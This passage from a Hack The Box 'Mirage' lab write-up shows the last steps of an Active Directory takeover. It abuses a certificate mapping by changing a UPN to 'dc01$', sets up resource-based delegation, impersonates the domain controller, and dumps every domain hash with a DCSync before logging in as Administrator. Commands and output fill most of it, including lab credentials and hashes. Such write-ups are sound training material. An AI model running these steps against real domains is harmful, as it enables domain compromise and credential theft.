It returns `1` which means that it controls Kerberos PKINIT authentication on DCs and together with the TLS/SSL cert mapping, we can leverage to request a certificate for `administrator` account. <br>
&rarr; Let's exploit this.

First let's generate back again the ticket from `Mirage-Service$` account.

```bash
└─$ getTGT.py mirage.htb/Mirage-Service\$ -hashes :305806d84f7c1be93a07aaf40f0c7866 -dc-ip 10.129.254.128
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Mirage-Service$.ccache

└─$ export KRB5CCNAME=Mirage-Service\$.ccache
```

Then we will certificate abuse by udpate `altSecurityIdentities` attribute.

```bash
└─$ certipy account \                       
-u 'Mirage-Service$' \
-k \       
-target dc01.mirage.htb \
-upn 'dc01$@mirage.htb' \
-user 'mark.bbond' update \
-dc-ip 10.129.254.128
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'mark.bbond':
    userPrincipalName                   : dc01$@mirage.htb
[*] Successfully updated 'mark.bbond'
```

We will then request certificate for `User` template with `mark.bbond` account.

```bash
└─$ export KRB5CCNAME=mark.bbond.ccache     

└─$ certipy req \                      
-k \
-target dc01.mirage.htb \
-ca 'mirage-DC01-CA' \
-template 'User' \
-dc-ip 10.129.253.202
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 12
[*] Successfully requested certificate
[*] Got certificate with UPN 'dc01$@mirage.htb'
[*] Certificate object SID is 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Saving certificate and private key to 'dc01.pfx'
[*] Wrote certificate and private key to 'dc01.pfx'
```

Now update `altSecurityIdentities` attribute again with `Mirage-Service$` account.

```bash
└─$ export KRB5CCNAME=Mirage-Service\$.ccache

└─$ certipy account \                       
-u 'Mirage-Service$' \
-k \
-target dc01.mirage.htb \
-upn 'mark.bbond@mirage.htb' \
-user 'mark.bbond' update \
-dc-ip 10.129.254.128
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'mark.bbond':
    userPrincipalName                   : mark.bbond@mirage.htb
[*] Successfully updated 'mark.bbond'
```

Let's authenticate with certificate.

```bash
└─$ certipy auth -pfx dc01.pfx -dc-ip 10.129.254.128 -ldap-shell      
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'dc01$@mirage.htb'
[*]     Security Extension SID: 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Connecting to 'ldaps://10.129.254.128:636'
[*] Authenticated to '10.129.254.128' as: 'u:MIRAGE\\DC01$'
Type help for list of commands

# whoami
u:MIRAGE\DC01$
```

We can set `dc01$` for `mark.bbond` via `set_rbcd`.

```bash
# set_rbcd dc01$ mark.bbond
Found Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb
Target SID: S-1-5-21-2127163471-3824721834-2568365109-1000

Found Grantee DN: CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=htb
Grantee SID: S-1-5-21-2127163471-3824721834-2568365109-1109
Delegation rights modified successfully!
mark.bbond can now impersonate users on dc01$ via S4U2Proxy

# exit
Bye!
```

### S4U2Proxy
Checking [S4U2Proxy](https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained#_2-additional-s4u2proxy), we can use this to impersonate `Mirage-Service$` account. <br>
&rarr; Run again the `bloodhound` and see the results.

For this part, you can just try `bloodhound-python` to collect the data and then upload to `bloodhound` to analyze the data. <br>
I will try this [RustHound](https://github.com/NH-RED-TEAM/RustHound) to see if we can collect more data.

```bash
└─$ ./RustHound/target/x86_64-unknown-linux-gnu/release/rusthound -d mirage.htb -f dc01.mirage.htb -u nathan.aadam -p '3edc#EDC3' -k --old-bloodhound --adcs --zip -o ~/HTB_Labs/DEPTHS_Season8/Mirage/nathan/mirage_results.zip
---------------------------------------------------
Initializing RustHound at 12:30:32 on 07/22/25
Powered by g0h4n from OpenCyber
---------------------------------------------------

[2025-07-22T16:30:32Z INFO  rusthound] Verbosity level: Info
[2025-07-22T16:30:32Z INFO  rusthound::ldap] Connected to MIRAGE.HTB Active Directory!
[2025-07-22T16:30:32Z INFO  rusthound::ldap] Starting data collection...
[2025-07-22T16:30:33Z INFO  rusthound::ldap] All data collected for NamingContext DC=mirage,DC=htb
[2025-07-22T16:30:33Z INFO  rusthound::ldap] All data collected for NamingContext CN=Configuration,DC=mirage,DC=htb
[2025-07-22T16:30:33Z INFO  rusthound::json::parser] Starting the LDAP objects parsing...
⠈ Parsing LDAP objects: 19%                                                                                                                                                                                                                                                                                                 [2025-07-22T16:30:33Z INFO  rusthound::modules::adcs::parser] Found 11 enabled certificate templates                                                                                                                                                                                                                        
[2025-07-22T16:30:33Z INFO  rusthound::json::parser] Parsing LDAP objects finished!
[2025-07-22T16:30:33Z INFO  rusthound::json::checker] Starting checker to replace some values...
[2025-07-22T16:30:33Z INFO  rusthound::json::checker] Checking and replacing some values finished!
[2025-07-22T16:30:33Z INFO  rusthound::modules] Starting checker for ADCS values...
[2025-07-22T16:30:34Z ERROR rusthound::modules::adcs::checker] Couldn't connect to server http://dc01.mirage.htb/certsrv/, please try manually and check for https access if EPA is enable.
[2025-07-22T16:30:34Z INFO  rusthound::modules] Checking for ADCS values finished!
[2025-07-22T16:30:34Z INFO  rusthound::json::maker] 12 users parsed!
[2025-07-22T16:30:34Z INFO  rusthound::json::maker] 65 groups parsed!
[2025-07-22T16:30:34Z INFO  rusthound::json::maker] 1 computers parsed!
[2025-07-22T16:30:34Z INFO  rusthound::json::maker] 21 ous parsed!
[2025-07-22T16:30:34Z INFO  rusthound::json::maker] 1 domains parsed!
[2025-07-22T16:30:34Z INFO  rusthound::json::maker] 1 cas parsed!
[2025-07-22T16:30:34Z INFO  rusthound::json::maker] 33 templates parsed!
[2025-07-22T16:30:34Z INFO  rusthound::json::maker] 2 gpos parsed!
[2025-07-22T16:30:34Z INFO  rusthound::json::maker] 21 containers parsed!
[2025-07-22T16:30:34Z INFO  rusthound::json::maker] /home/kali/HTB_Labs/DEPTHS_Season8/Mirage/nathan/mirage_results.zip/20250722123034_mirage-htb_rusthound.zip created!

RustHound Enumeration Completed at 12:30:34 on 07/22/25! Happy Graphing!
```

![mirage](/assets/img/mirage-htb-season8/mirage-htb-season8_bloodhound_4.png)

So we can see that `mark.bbond` has **AllowedToAct** over `DC01` account.

![mirage](/assets/img/mirage-htb-season8/mirage-htb-season8_bloodhound_5.png)

And also `DC01` has **[CoerceToTGT](https://bloodhound.specterops.io/resources/edges/coerce-to-tgt)** over `Mirage.htb` domain which we can **DCSync** with `secretsdump.py`.

```bash
└─$ getST.py -spn 'CIFS/dc01.mirage.htb' -impersonate 'DC01$' 'MIRAGE.HTB/mark.bbond:1day@atime' -k
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating DC01$
/usr/local/bin/getST.py:378: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/local/bin/getST.py:475: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2self
[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Probably user mark.bbond does not have constrained delegation permisions or impersonated user does not exist
```

So we can not imersonate `dc01$` from `mark.bbond` so we gonna set delegation rights for `nathan.aadam` account to `DC01` account.

```bash
# set_rbcd dc01$ nathan.aadam
Found Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb
Target SID: S-1-5-21-2127163471-3824721834-2568365109-1000

Found Grantee DN: CN=nathan.aadam,OU=Users,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb
Grantee SID: S-1-5-21-2127163471-3824721834-2568365109-1110
Delegation rights modified successfully!
nathan.aadam can now impersonate users on dc01$ via S4U2Proxy

# exit
Bye!
```

Then we will back again the environment to `nathan.aadam` account and use [getST.py](https://github.com/fortra/impacket/blob/master/examples/getST.py) to get the TGT for `DC01$` account.

```bash
└─$ export KRB5CCNAME=nathan.aadam.ccache 

└─$ getST.py -spn 'CIFS/dc01.mirage.htb' -impersonate 'DC01$' 'MIRAGE.HTB/nathan.aadam:3edc#EDC3' -k
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating DC01$
/usr/local/bin/getST.py:378: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/local/bin/getST.py:475: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2self
/usr/local/bin/getST.py:605: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/local/bin/getST.py:657: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@CIFS_dc01.mirage.htb@MIRAGE.HTB.ccache
```

Now we can **DCSync** with `DC01$` privileges.

```bash
└─$ export KRB5CCNAME=DC01\$@CIFS_dc01.mirage.htb@MIRAGE.HTB.ccache

└─$ secretsdump.py -k -no-pass dc01.mirage.htb                            
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
mirage.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1adcc3d4a7f007ca8ab8a3a671a66127:::
mirage.htb\Dev_Account_A:1104:aad3b435b51404eeaad3b435b51404ee:3db621dd880ebe4d22351480176dba13:::
mirage.htb\Dev_Account_B:1105:aad3b435b51404eeaad3b435b51404ee:fd1a971892bfd046fc5dd9fb8a5db0b3:::
mirage.htb\david.jjackson:1107:aad3b435b51404eeaad3b435b51404ee:ce781520ff23cdfe2a6f7d274c6447f8:::
mirage.htb\javier.mmarshall:1108:aad3b435b51404eeaad3b435b51404ee:694fba7016ea1abd4f36d188b3983d84:::
mirage.htb\mark.bbond:1109:aad3b435b51404eeaad3b435b51404ee:8fe1f7f9e9148b3bdeb368f9ff7645eb:::
mirage.htb\nathan.aadam:1110:aad3b435b51404eeaad3b435b51404ee:1cdd3c6d19586fd3a8120b89571a04eb:::
mirage.htb\svc_mirage:2604:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b5b26ce83b5ad77439042fbf9246c86c:::
Mirage-Service$:1112:aad3b435b51404eeaad3b435b51404ee:305806d84f7c1be93a07aaf40f0c7866:::
[*] Kerberos keys grabbed
mirage.htb\Administrator:aes256-cts-hmac-sha1-96:09454bbc6da252ac958d0eaa211293070bce0a567c0e08da5406ad0bce4bdca7
mirage.htb\Administrator:aes128-cts-hmac-sha1-96:47aa953930634377bad3a00da2e36c07
mirage.htb\Administrator:des-cbc-md5:e02a73baa10b8619
krbtgt:aes256-cts-hmac-sha1-96:95f7af8ea1bae174de9666c99a9b9edeac0ca15e70c7246cab3f83047c059603
krbtgt:aes128-cts-hmac-sha1-96:6f790222a7ee5ba9d2776f6ee71d1bfb
krbtgt:des-cbc-md5:8cd65e54d343ba25
mirage.htb\Dev_Account_A:aes256-cts-hmac-sha1-96:e4a6658ff9ee0d2a097864d6e89218287691bf905680e0078a8e41498f33fd9a
mirage.htb\Dev_Account_A:aes128-cts-hmac-sha1-96:ceee67c4feca95b946e78d89cb8b4c15
mirage.htb\Dev_Account_A:des-cbc-md5:26dce5389b921a52
mirage.htb\Dev_Account_B:aes256-cts-hmac-sha1-96:5c320d4bef414f6a202523adfe2ef75526ff4fc6f943aaa0833a50d102f7a95d
mirage.htb\Dev_Account_B:aes128-cts-hmac-sha1-96:e05bdceb6b470755cd01fab2f526b6c0
mirage.htb\Dev_Account_B:des-cbc-md5:e5d07f57e926ecda
mirage.htb\david.jjackson:aes256-cts-hmac-sha1-96:3480514043b05841ecf08dfbf33d81d361e51a6d03ff0c3f6d51bfec7f09dbdb
mirage.htb\david.jjackson:aes128-cts-hmac-sha1-96:bd841caf9cd85366d254cd855e61cd5e
mirage.htb\david.jjackson:des-cbc-md5:76ef68d529459bbc
mirage.htb\javier.mmarshall:aes256-cts-hmac-sha1-96:20acfd56be43c1123b3428afa66bb504a9b32d87c3269277e6c917bf0e425502
mirage.htb\javier.mmarshall:aes128-cts-hmac-sha1-96:9d2fc7611e15be6fe16538ebb3b2ad6a
mirage.htb\javier.mmarshall:des-cbc-md5:6b3d51897fdc3237
mirage.htb\mark.bbond:aes256-cts-hmac-sha1-96:dc423caaf884bb869368859c59779a757ff38a88bdf4197a4a284b599531cd27
mirage.htb\mark.bbond:aes128-cts-hmac-sha1-96:78fcb9736fbafe245c7b52e72339165d
mirage.htb\mark.bbond:des-cbc-md5:d929fb462ae361a7
mirage.htb\nathan.aadam:aes256-cts-hmac-sha1-96:b536033ac796c7047bcfd47c94e315aea1576a97ff371e2be2e0250cce64375b
mirage.htb\nathan.aadam:aes128-cts-hmac-sha1-96:b1097eb42fd74827c6d8102a657e28ff
mirage.htb\nathan.aadam:des-cbc-md5:5137a74f40f483c7
mirage.htb\svc_mirage:aes256-cts-hmac-sha1-96:937efa5352253096b3b2e1d31a9f378f422d9e357a5d4b3af0d260ba1320ba5e
mirage.htb\svc_mirage:aes128-cts-hmac-sha1-96:8d382d597b707379a254c60b85574ab1
mirage.htb\svc_mirage:des-cbc-md5:2f13c12f9d5d6708
DC01$:aes256-cts-hmac-sha1-96:4a85665cd877c7b5179c508e5bc4bad63eafe514f7cedb0543930431ef1e422b
DC01$:aes128-cts-hmac-sha1-96:94aa2a6d9e156b7e8c03a9aad4af2cc1
DC01$:des-cbc-md5:cb19ce2c733b3ba8
Mirage-Service$:aes256-cts-hmac-sha1-96:80bada65a4f84fb9006013e332105db15ac6f07cb9987705e462d9491c0482ae
Mirage-Service$:aes128-cts-hmac-sha1-96:ff1d75e3a88082f3dffbb2b8e3ff17dd
Mirage-Service$:des-cbc-md5:c42ffd455b91f208
[*] Cleaning up...
```

Got the hashes of `Administrator` account. Let's grab the ticket from `Administrator` account and update the `KRB5CCNAME`.

```bash
└─$ getTGT.py -hashes :7be6d4f3c2b9c0e3560f5a29eeb1afb3 -dc-ip 10.129.254.128 mirage.htb/Administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache

└─$ export KRB5CCNAME=Administrator.ccache                         
```

```powershell
└─$ evil-winrm -i dc01.mirage.htb -u Administrator -r mirage.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         7/22/2025   2:23 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
bf797d485a0b63a55faa5362c7674911
```

Nailed the `root.txt` flag.

> **Lesson learned:** There are some certificates services we can not identify with `certipy-find` as it will not show the results so we need to test manually by reading the wiki section from each services. As far as I know that these three `ESC10`, `ESC12` and `ESC14` need to be tested manually.

![result](/assets/img/mirage-htb-season8/result.png)